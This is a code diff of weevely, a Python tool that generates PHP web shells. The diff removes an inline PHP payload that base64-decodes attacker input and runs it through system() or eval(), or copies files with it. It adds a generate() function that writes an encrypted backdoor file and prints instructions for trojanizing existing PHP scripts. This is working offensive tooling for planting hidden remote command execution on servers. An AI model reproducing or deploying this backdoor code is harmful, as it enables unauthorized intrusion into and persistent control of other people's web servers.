@@ -3,23 +3,6 @@
 from numpy import frombuffer, bitwise_xor, byte
 import getopt, sys, base64, os, urllib2, re, urlparse
     
-back="""
-$ref[1] = base64_decode($ref[1]);
-switch($ref[2]){
-	case 0:
-		system($ref[1]." 2>&1");
-		break;
-	case 1:
-		$cmd = explode(' ', $ref[1]);
-		echo file_put_contents($cmd[1], file_get_contents($cmd[0]))."\n";
-		break;
-	case 2:
-		@eval($ref[1]);
-		break;
-}
-"""
-
-
 class weevely:
   def main(self):
     
@@ -158,7 +141,18 @@ class weevely:
 	  print self.execute(url, pwd, cmnd, 0)
 
   def generate(self,key,path):
-    print self.crypt(back,key)
+    f_tocrypt = file('php/text_to_crypt.php')
+    f_back = file('php/backdoor.php')
+    f_output = file(path,'w')
+    
+    str_tocrypt = f_tocrypt.read()
+    str_crypted = self.crypt(str_tocrypt,key)
+    #print str_crypted
+    str_back = f_back.read()
+    new_str = str_back.replace('%%%TEXT-CRYPTED%%%', str_crypted)
+    
+    f_output.write(new_str)
+    print '+ Backdoor file ' + path + ' created with password '+ key + '.\n+ Insert the code to trojanize an existing PHP script, or use the php file as is. Exiting.'
      
     
 if __name__ == "__main__":
